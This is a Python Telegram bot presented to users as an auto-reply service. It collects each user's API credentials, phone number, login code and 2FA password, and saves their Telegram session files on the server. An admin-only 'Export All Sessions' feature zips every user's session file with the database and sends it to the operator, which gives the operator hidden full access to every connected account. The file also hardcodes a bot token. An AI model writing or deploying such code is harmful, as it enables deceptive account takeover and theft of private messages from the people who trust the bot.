import os
import asyncio
import aiosqlite
import logging
import zipfile
import shutil
from flask import Flask
from threading import Thread
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telethon import TelegramClient, errors, events

logging.basicConfig(level=logging.INFO)
BOT_TOKEN = "8313268540:AAE3hNn4wZPclRmrOBRQ-IRHFcNM2KTf0RQ"
ADMIN_IDS = [8373846582]
DB_NAME = 'mydata.db'
SESSION_DIR = 'sessions'
CREDIT = "「 Prime Xyron 」offical👨‍💻"

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}
active_clients = {}
maintenance_mode = False

app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, api_id INTEGER, api_hash TEXT, phone TEXT,
            custom_reply TEXT DEFAULT 'I am busy right now, talk to you later.')''')
        await db.commit()

async def start_user_listener(uid, phone, api_id, api_hash):
    if uid in active_clients: return
    session_path = os.path.join(SESSION_DIR, str(phone))
    client = TelegramClient(session_path, int(api_id), api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized(): return
        
        @client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
        async def handler(event):
            if maintenance_mode: return
            async with aiosqlite.connect(DB_NAME) as db:
                async with db.execute('SELECT custom_reply FROM users WHERE user_id = ?', (uid,)) as cursor:
                    row = await cursor.fetchone()
                    reply = row[0] if row else "Busy."
            await asyncio.sleep(1)
            await event.reply(reply)
            
        active_clients[uid] = client
        await client.run_until_disconnected()
    except:
        active_clients.pop(uid, None)

def main_menu(uid):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("⚙️ Account Settings", "✏️ Set Auto Reply")
    markup.add("📊 My Status", "🆘 Support")
    if uid in ADMIN_IDS:
        markup.add("👑 Admin Panel")
    return markup

def acc_markup(is_logged):
    markup = InlineKeyboardMarkup()
    if not is_logged:
        markup.add(InlineKeyboardButton("➕ Login New Account", callback_data="l_init"))
    else:
        markup.add(InlineKeyboardButton("❌ Logout & Disconnect", callback_data="l_out"))
    return markup

def admin_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    status = "🔴 Maintenance: ON" if maintenance_mode else "🟢 Maintenance: OFF"
    markup.add(InlineKeyboardButton(status, callback_data="toggle_m"),
               InlineKeyboardButton("📢 Broadcast", callback_data="b_cast"))
    markup.add(InlineKeyboardButton("📂 Export All Sessions", callback_data="export_zip"))
    return markup

@bot.message_handler(func=lambda m: maintenance_mode and m.from_user.id not in ADMIN_IDS)
async def check_maintenance(message):
    await bot.send_message(message.chat.id, "⚠️ **Maintenance Alert!**\nThe bot is currently under maintenance. Please try again later.")

@bot.message_handler(commands=['start'])
async def start_msg(message):
    uid = message.from_user.id
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (uid,))
        await db.commit()
    
    welcome = (
        f"👋 **Welcome to Auto-Responder!**\n\n"
        f"Use this bot to set an auto-reply for your personal Telegram account.\n\n"
        f"🚀 **Main Features:**\n"
        f"• High-Speed Auto Response\n"
        f"• Custom Message Support\n"
        f"• Secure Session Management\n\n"
        f"Developer: {CREDIT}"
    )
    await bot.send_message(uid, welcome, reply_markup=main_menu(uid), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "⚙️ Account Settings")
async def settings(message):
    uid = message.from_user.id
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute('SELECT phone FROM users WHERE user_id = ?', (uid,)) as cursor:
            row = await cursor.fetchone()
            is_logged = True if (row and row[0]) else False
            status = "✅ Connected" if is_logged else "❌ Disconnected"
            await bot.send_message(uid, f"⚙️ **Account Settings**\n\nCurrent Status: {status}\n\nYou can only connect one account at a time.", 
                                   reply_markup=acc_markup(is_logged), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "✏️ Set Auto Reply")
async def set_reply(message):
    user_states[message.from_user.id] = {'step': 'wait_reply'}
    await bot.send_message(message.chat.id, "📝 Send your custom auto-reply message:")

@bot.message_handler(func=lambda m: m.text == "🆘 Support")
async def support(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Developer 1", url="https://t.me/rx_nahin_bot"),
               InlineKeyboardButton("Developer 2", url="https://t.me/zerox6t9"))
    await bot.send_message(message.chat.id, f"🆘 **Support Center**\n\nContact admins for help.\n\nPowered By {CREDIT}", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📊 My Status")
async def show_status(message):
    uid = message.from_user.id
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute('SELECT phone, custom_reply FROM users WHERE user_id = ?', (uid,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0]:
                on = "🟢 Active" if uid in active_clients else "🔴 Offline"
                text = f"📊 **Your Account Status**\n\n📱 Phone: `{row[0]}`\n💬 Message: `{row[1]}`\n📡 Status: {on}"
            else:
                text = "❌ No account found in database."
            await bot.send_message(uid, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel" and m.from_user.id in ADMIN_IDS)
async def admin_panel_view(message):
    await bot.send_message(message.chat.id, "⚡ **Admin Control Panel**", reply_markup=admin_markup())

@bot.callback_query_handler(func=lambda call: True)
async def handle_callbacks(call):
    uid = call.from_user.id
    if call.data == "l_init":
        user_states[uid] = {'step': 'api'}
        await bot.send_message(uid, "🔑 Send your **API_ID:API_HASH**:")
    elif call.data == "l_out":
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute('UPDATE users SET phone=NULL WHERE user_id=?', (uid,))
            await db.commit()
        if uid in active_clients:
            await active_clients[uid].disconnect()
            active_clients.pop(uid)
        await bot.send_message(uid, "✅ Account disconnected successfully.")
    elif call.data == "toggle_m" and uid in ADMIN_IDS:
        global maintenance_mode
        maintenance_mode = not maintenance_mode
        await bot.edit_message_text("⚡ **Admin Control Panel**", uid, call.message.message_id, reply_markup=admin_markup())
    elif call.data == "export_zip" and uid in ADMIN_IDS:
        await handle_export(uid)
    elif call.data == "b_cast" and uid in ADMIN_IDS:
        user_states[uid] = {'step': 'broadcast'}
        await bot.send_message(uid, "📢 Send your broadcast message:")

async def handle_export(uid):
    await bot.send_message(uid, "⏳ Generating ZIP file...")
    zip_path = "all_data_backup.zip"
    with zipfile.ZipFile(zip_path, 'w') as z:
        z.write(DB_NAME)
        if os.path.exists(SESSION_DIR):
            for f in os.listdir(SESSION_DIR):
                if f.endswith(".session"):
                    z.write(os.path.join(SESSION_DIR, f), arcname=f"sessions/{f}")
    with open(zip_path, 'rb') as f:
        await bot.send_document(uid, f, caption=f"📁 Database and Sessions Backup.\n\nCredit: {CREDIT}")
    os.remove(zip_path)

@bot.message_handler(func=lambda m: m.from_user.id in user_states)
async def process_inputs(message):
    uid = message.from_user.id
    state = user_states[uid]['step']

    if state == 'wait_reply':
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute('UPDATE users SET custom_reply = ? WHERE user_id = ?', (message.text, uid))
            await db.commit()
        await bot.send_message(uid, "✅ Auto-reply updated.")
        user_states.pop(uid)

    elif state == 'broadcast':
        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute('SELECT user_id FROM users') as cursor:
                async for row in cursor:
                    try: await bot.send_message(row[0], f"📢 **New Announcement**\n\n{message.text}\n\n— {CREDIT}")
                    except: pass
        await bot.send_message(uid, "✅ Broadcast completed.")
        user_states.pop(uid)
    
    elif state == 'api':
        try:
            aid, ahash = message.text.split(':')
            user_states[uid].update({'api_id': aid.strip(), 'api_hash': ahash.strip(), 'step': 'phone'})
            await bot.send_message(uid, "📞 Send your phone number (+880...):")
        except: await bot.send_message(uid, "❌ Format: `API_ID:API_HASH`")

    elif state == 'phone':
        phone = message.text.strip()
        user_states[uid]['phone'] = phone
        await bot.send_message(uid, "📡 Connecting...")
        try:
            client = TelegramClient(os.path.join(SESSION_DIR, phone), int(user_states[uid]['api_id']), user_states[uid]['api_hash'])
            await client.connect()
            sent = await client.send_code_request(phone)
            user_states[uid].update({'hash': sent.phone_code_hash, 'step': 'otp', 'client': client})
            await bot.send_message(uid, "📩 Enter the OTP code:")
        except Exception as e:
            await bot.send_message(uid, f"❌ Error: {e}")
            user_states.pop(uid)

    elif state == 'otp':
        try:
            client = user_states[uid]['client']
            await client.sign_in(user_states[uid]['phone'], message.text.strip(), phone_code_hash=user_states[uid]['hash'])
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute('UPDATE users SET api_id=?, api_hash=?, phone=? WHERE user_id=?', 
                                 (user_states[uid]['api_id'], user_states[uid]['api_hash'], user_states[uid]['phone'], uid))
                await db.commit()
            await bot.send_message(uid, "✅ Login success! Auto-reply is active.")
            asyncio.create_task(start_user_listener(uid, user_states[uid]['phone'], user_states[uid]['api_id'], user_states[uid]['api_hash']))
            user_states.pop(uid)
        except errors.SessionPasswordNeededError:
            user_states[uid]['step'] = '2fa'
            await bot.send_message(uid, "🔐 Enter 2FA Password:")
        except Exception as e: await bot.send_message(uid, f"❌ Error: {e}")

    elif state == '2fa':
        try:
            await user_states[uid]['client'].sign_in(password=message.text.strip())
            await bot.send_message(uid, "✅ Login success with 2FA.")
            user_states.pop(uid)
        except Exception as e: await bot.send_message(uid, f"❌ Wrong password: {e}")

async def main():
    await init_db()
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute('SELECT user_id, phone, api_id, api_hash FROM users WHERE phone IS NOT NULL') as cursor:
            async for row in cursor:
                asyncio.create_task(start_user_listener(row[0], row[1], row[2], row[3]))
    
    print(f"Bot Started by {CREDIT}")
    await bot.polling(non_stop=True, skip_pending=True)

if __name__ == '__main__':
    Thread(target=run_flask).start()
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
